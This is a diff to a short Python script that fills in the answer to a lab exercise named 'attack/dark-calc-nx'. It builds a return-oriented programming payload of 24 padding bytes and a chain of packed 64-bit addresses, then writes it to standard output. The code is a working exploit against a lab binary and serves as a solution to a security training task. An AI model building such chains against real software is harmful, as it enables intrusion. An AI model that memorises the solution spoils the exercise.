@@ -1,10 +1,12 @@
-#!/usr/bin/env python3
-"""Task 3: build the payload for attack/dark-calc-nx.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
 import sys
-
-payload = b""
-
+def pack(address):
+    return address.to_bytes(8, "little")
+payload = b"A" * 24
+payload += pack(0x401a34)
+payload += pack(0x401a33)
+payload += pack(4)
+payload += pack(0x401978)
+payload += pack(0x401a34)
+payload += pack(0x4016e0)
+payload += b"\n"
 sys.stdout.buffer.write(payload)
